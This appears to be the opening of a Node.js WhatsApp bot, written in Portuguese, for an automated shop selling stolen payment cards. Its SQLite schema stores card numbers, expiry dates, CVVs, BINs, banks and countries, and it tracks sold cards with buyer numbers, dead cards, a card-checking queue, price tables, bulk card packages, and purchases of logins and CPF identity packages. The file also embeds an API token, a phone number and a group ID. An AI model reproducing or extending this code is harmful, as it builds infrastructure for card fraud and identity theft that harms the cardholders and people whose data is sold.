//##########################################################################################
//#░█████╗░░█████╗░███╗░░██╗███████╗██╗░██████╗░  ██╗███╗░░██╗██╗░█████╗░██╗░█████╗░██╗░░░░░
//#██╔══██╗██╔══██╗████╗░██║██╔════╝██║██╔════╝░  ██║████╗░██║██║██╔══██╗██║██╔══██╗██║░░░░░
//#██║░░╚═╝██║░░██║██╔██╗██║█████╗░░██║██║░░██╗░  ██║██╔██╗██║██║██║░░╚═╝██║███████║██║░░░░░
//#██║░░██╗██║░░██║██║╚████║██╔══╝░░██║██║░░╚██╗  ██║██║╚████║██║██║░░██╗██║██╔══██║██║░░░░░
//#╚█████╔╝╚█████╔╝██║░╚███║██║░░░░░██║╚██████╔╝  ██║██║░╚███║██║╚█████╔╝██║██║░░██║███████╗
//#░╚════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚═════╝░  ╚═╝╚═╝░░╚══╝╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
//##########################################################################################

Nome_Dono = "Demo"
Numero_Dono = "5511969059576"
//━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━

VERSAO = 193
const wppconnect = require('@wppconnect-team/wppconnect');
const sqlite3 = require('sqlite3');
const { PythonShell } = require("python-shell");
const fs = require('fs');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
var request = require('request');
const fastFolderSize = require('fast-folder-size')
var exec = require('child_process').exec;

Adms = []
INTERVALO_SPAM = 10000
MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAOV2 = 2000
Diretorio_SQLITE_Principal = `./${Nome_Dono}_DB.sqlite`
DataBase_Better = require('better-sqlite3')(Diretorio_SQLITE_Principal);

Array_Fila_Espera = []
Abastecendo = false
ChecandoCC = false
Contagem_Envios_Msnall = 0
Contagem_Alteracao_Saldo = 0
Ultrapassar_nada_por_aqui = 0
Saldo_Anterior = 12345
Array_Tentativa_Pix = []
Array_Tentativa_Pix_MS = 0
BINs_CHK = "0"
Token_Ifind = "9b5b985f-a505-4890-9f93-485aad01a94f"
Array_Planiha_Mudancas = []
Expiracao_Ouvir_Email = 41472000000
ITEM_FILA_PACOTE = "LIBERADO"
CONTATO_CHK = "0"
CONTADOR_TENTATIVA_CHECKER = 0
ID_GRUPO_CIDADE_DOS_BOTS = "120363040790339484@g.us"
OCULTAR_NUMERO_VIDEO = false
Tamanho_Token = 0
Array_Cliente_Desistiu_Checagem = []
Requestando_MS = 0
Var_Request_ID_CHK = 0
Var_Request_CONTATO_CHK = 0
Var_Request = 0
Ativar_Reiniciar_Auto_Bug_Rato = false
Start_MS = Date.now()

FOTO_Registro_GP = `Fotos_${Nome_Dono}/registro_gp.jpeg`

FOTO_Adicionou_Pix_PV = `Fotos_${Nome_Dono}/add_pix_pv.jpeg`
FOTO_Adicionou_Pix_GP = `Fotos_${Nome_Dono}/add_pix_gp.jpeg`

FOTO_Resgatou_Gift_PV = `Fotos_${Nome_Dono}/gift_pv.jpeg`
FOTO_Resgatou_Gift_GP = `Fotos_${Nome_Dono}/gift_gp.jpeg`

FOTO_Comprou_CC_PV = `Fotos_${Nome_Dono}/comprou_cc_pv.jpeg`
FOTO_Comprou_CC_GP = `Fotos_${Nome_Dono}/comprou_cc_gp.jpeg`
FOTO_Comprou_Mix_PV = `Fotos_${Nome_Dono}/comprou_mix_pv.jpeg`
FOTO_Comprou_Mix_GP = `Fotos_${Nome_Dono}/comprou_mix_gp.jpeg`
FOTO_Comprou_PacoteCC_PV = `Fotos_${Nome_Dono}/comprou_pacote_cc_pv.jpeg`
FOTO_Comprou_PacoteCC_GP = `Fotos_${Nome_Dono}/comprou_pacote_cc_gp.jpeg`

FOTO_Comprou_Consultavel_PV = `Fotos_${Nome_Dono}/comprou_consul_pv.jpeg`
FOTO_Comprou_Consultavel_GP = `Fotos_${Nome_Dono}/comprou_consul_gp.jpeg`

FOTO_Comprou_Consultada_PV = `Fotos_${Nome_Dono}/comprou_consul_pv.jpeg`
FOTO_Comprou_Consultada_GP = `Fotos_${Nome_Dono}/comprou_consul_gp.jpeg`

FOTO_Comprou_Login_GP = `Fotos_${Nome_Dono}/comprou_login_gp.jpeg`

FOTO_Comprou_Trilha_GP = `Fotos_${Nome_Dono}/comprou_trilha_gp.jpeg`

FOTO_Comprou_Lara_PV = `Fotos_${Nome_Dono}/comprou_lara_pv.jpeg`
FOTO_Comprou_Lara_GP = `Fotos_${Nome_Dono}/comprou_lara_gp.jpeg`

FOTO_Comprou_PCT_CPF_PV = `Fotos_${Nome_Dono}/Pacote_CPF_comprado_pv.jpg`
FOTO_Comprou_PCT_CPF_GP = `Fotos_${Nome_Dono}/Pacote_CPF_comprado_pv.jpg`

FOTO_Indicou_GP = `Fotos_${Nome_Dono}/indicou_GP.jpeg`
//━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━━━━━━━━━❪❃❫━━━━━━━━

exec(`$host.UI.RawUI.WindowTitle = "${Nome_Dono}"`, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
    // do whatever with stdout
})

if (!fs.existsSync('./Pacotes')) {
    fs.mkdirSync('./Pacotes');
}
if (!fs.existsSync('./PacotesMIX')) {
    fs.mkdirSync('./PacotesMIX');
}
if (!fs.existsSync('./PacotesCC')) {
    fs.mkdirSync('./PacotesCC');
}
if (!fs.existsSync('./Misc')) {
    fs.mkdirSync('./Misc');
}

// ARQUIVO_BINS = ""
// fs.readFile('./RimuruBinsDB.csv', 'utf8', function (err, data) {
//     if (err) {
//         return console.log(err);
//     }
//     //console.log(ARQUIVO_BINS);
//     ARQUIVO_BINS = data
// });

//##########################################################################################
//#░█████╗░░█████╗░███╗░░██╗███████╗██╗░██████╗░  ██╗███╗░░██╗██╗░█████╗░██╗░█████╗░██╗░░░░░
//#██╔══██╗██╔══██╗████╗░██║██╔════╝██║██╔════╝░  ██║████╗░██║██║██╔══██╗██║██╔══██╗██║░░░░░
//#██║░░╚═╝██║░░██║██╔██╗██║█████╗░░██║██║░░██╗░  ██║██╔██╗██║██║██║░░╚═╝██║███████║██║░░░░░
//#██║░░██╗██║░░██║██║╚████║██╔══╝░░██║██║░░╚██╗  ██║██║╚████║██║██║░░██╗██║██╔══██║██║░░░░░
//#╚█████╔╝╚█████╔╝██║░╚███║██║░░░░░██║╚██████╔╝  ██║██║░╚███║██║╚█████╔╝██║██║░░██║███████╗
//#░╚════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚═════╝░  ╚═╝╚═╝░░╚══╝╚═╝░╚════╝░╚═╝╚═╝░░╚═╝╚══════╝
//##########################################################################################

//##########################
//#
//#░██████╗░██████╗░██╗░░░░░
//#██╔════╝██╔═══██╗██║░░░░░
//#╚█████╗░██║██╗██║██║░░░░░
//#░╚═══██╗╚██████╔╝██║░░░░░
//#██████╔╝░╚═██╔═╝░███████╗
//#╚═════╝░░░░╚═╝░░░╚══════╝
//##########################

if (1 === 1) {
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS MENSAGENS_ENVIARV3
(
PROCESSADO VARCHAR(32) NOT NULL DEFAULT '0',
ID_CONTATO VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
TEXTO VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_buttonText VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_title VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_rows VARCHAR(32) NOT NULL DEFAULT '0',
Caminho_arquivo VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS MENSAGENS_ENVIARV3_ADMS_GRUPOS
(
PROCESSADO VARCHAR(32) NOT NULL DEFAULT '0',
ID_CONTATO VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
TEXTO VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_buttonText VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_title VARCHAR(32) NOT NULL DEFAULT '0',
CONSTRUCAO_LISTMESSAGE_rows VARCHAR(32) NOT NULL DEFAULT '0',
Caminho_arquivo VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS NIVEL_IGNORAR
(
NIVEL VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BININFO_BIN
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
PARAMETRO VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BINPERSONALIZADA_BANDEIRA
(
CONTEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
NOVO_NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BINPERSONALIZADA_NIVEL
(
CONTEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
NOVO_NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BINPERSONALIZADA_BANCO
(
CONTEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
NOVO_NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BINPERSONALIZADA_PAIS
(
CONTEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
NOVO_NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS BINPERSONALIZADA_BANDEIRA_NIVEL
(
CONTEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
NOVO_NOME VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO VARCHAR(32) NOT NULL DEFAULT '0',
MES VARCHAR(32) NOT NULL DEFAULT '0',
ANO VARCHAR(32) NOT NULL DEFAULT '0',
CVV VARCHAR(32) NOT NULL DEFAULT '0',
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
DADOS VARCHAR(32) NOT NULL DEFAULT '#',
TIPOCC VARCHAR(32) NOT NULL DEFAULT '#',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(NUMERO)
)`
    ).run()
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS ADD DADOS VARCHAR(32) NOT NULL DEFAULT '#';`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS ADD TIPOCC VARCHAR(32) NOT NULL DEFAULT 1;`).run()
    } catch (error) {
    }
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_VENDIDAS
(
NUMERO VARCHAR(32) NOT NULL DEFAULT '0',
MES VARCHAR(32) NOT NULL DEFAULT '0',
ANO VARCHAR(32) NOT NULL DEFAULT '0',
CVV VARCHAR(32) NOT NULL DEFAULT '0',
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
DADOS VARCHAR(32) NOT NULL DEFAULT '0',
Data_MS_Inserido VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS_VENDIDAS ADD DADOS tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS_VENDIDAS ADD TIPOCC tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_NIVEL
(
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(NIVEL)
)`
    ).run()
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_NIVEL_FULL
(
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(NIVEL)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BANDEIRA
(
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BANDEIRA)
)`
    ).run()
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BANDEIRA_FULL
(
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BANDEIRA)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BANCO
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BANCO)
)`
    ).run()
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BANCO_FULL
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BANCO)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_PAIS
(
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(PAIS)
)`
    ).run()
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_PAIS_FULL
(
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(PAIS)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BIN
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BIN)
)`
    ).run()
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_PRECOS_BIN_FULL
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(BIN)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CCS_DIE
(
BIN VARCHAR(32),
NUMERO VARCHAR(32),
MES VARCHAR(32),
ANO VARCHAR(32),
CVV VARCHAR(32),
BANDEIRA VARCHAR(32),
TIPO VARCHAR(32),
NIVEL VARCHAR(32),
BANCO VARCHAR(32),
PAIS VARCHAR(32),
DADOS VARCHAR(32),
TIPOCC VARCHAR(32),
NUMERO_TENTOU_COMPRAR VARCHAR(32),
Data_MS_Inserido VARCHAR(32)
)`
    ).run()
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS_DIE ADD DADOS VARCHAR(32) NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CCS_DIE ADD TIPOCC VARCHAR(32) NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CHECAR_CC_V2
(
CONTATO VARCHAR(32) DEFAULT '0',
CC VARCHAR(32) DEFAULT '0',
TIPOCC VARCHAR(32) DEFAULT '0',
DADOS_CHECAGEM VARCHAR(32) DEFAULT '0',
RESULTADO_CHK VARCHAR(32) DEFAULT '0',
PROCESSADO VARCHAR(32) DEFAULT '0',
VALOR_CC VARCHAR(32) DEFAULT '0',
DATA_INSERIDO_MS VARCHAR(32) DEFAULT '0'
)`
    ).run()
    // //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃

    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CC
    // (
    // NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
    // QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
    // VALOR VARCHAR(32) NOT NULL DEFAULT '0'
    // )`
    //     ).run()
    //     //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CC_VENDIDOS
    // (
    // NIVEL VARCHAR(32),
    // QUANTIDADE VARCHAR(32),
    // VALOR VARCHAR(32),
    // COMPRADOR VARCHAR(32),
    // DATA_INSERIDO_MS VARCHAR(32)
    // )`
    //     ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS MIX
    // (
    // QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
    // VALOR VARCHAR(32) NOT NULL DEFAULT '0'
    // )`
    //     ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_MIX
(
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_MIX_FULL
(
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_NIVEL
(
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_NIVEL_FULL
(
NIVEL VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BANCO
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BANCO_FULL
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_PAIS
(
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_PAIS_FULL
(
PAIS VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BANDEIRA
(
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BANDEIRA_FULL
(
BANDEIRA VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BIN
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS Opcoes_Pacote_CCs_BIN_FULL
(
BIN VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //     //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS MIX_VENDIDOS
    // (
    // QUANTIDADE VARCHAR(32),
    // VALOR VARCHAR(32),
    // COMPRADOR VARCHAR(32),
    // DATA_INSERIDO_MS VARCHAR(32)
    // )`
    //     ).run()
    //     //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CC_VENDIDOSV2
    // (
    // QUANTIDADE VARCHAR(32),
    // VALOR VARCHAR(32),
    // COLUNA VARCHAR(32),
    // TIPOCC VARCHAR(32),
    // COMPRADOR VARCHAR(32),
    // DATA_INSERIDO_MS VARCHAR(32)
    // )`
    //     ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CC_VENDIDOSV3
(
QUANTIDADE VARCHAR(32),
VALOR VARCHAR(32),
COLUNA VARCHAR(32),
PARAMETRO VARCHAR(32),
TIPOCC VARCHAR(32),
COMPRADOR VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32)
)`
    ).run()
    //     //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS MIX_CCS_SEPARADAS_ENVIAR
    // (
    // CC VARCHAR(32),
    // ID_CONTATO VARCHAR(32),
    // DATA_INSERIDO_MS VARCHAR(32)
    // )`
    //     ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PCT_CCS_SEPARADAS_ENVIAR
(
CC VARCHAR(32),
ID_CONTATO VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTE_CCS_SEPARADAS_ENVIAR
(
CC VARCHAR(32),
ID_CONTATO VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32)
)`
    ).run()
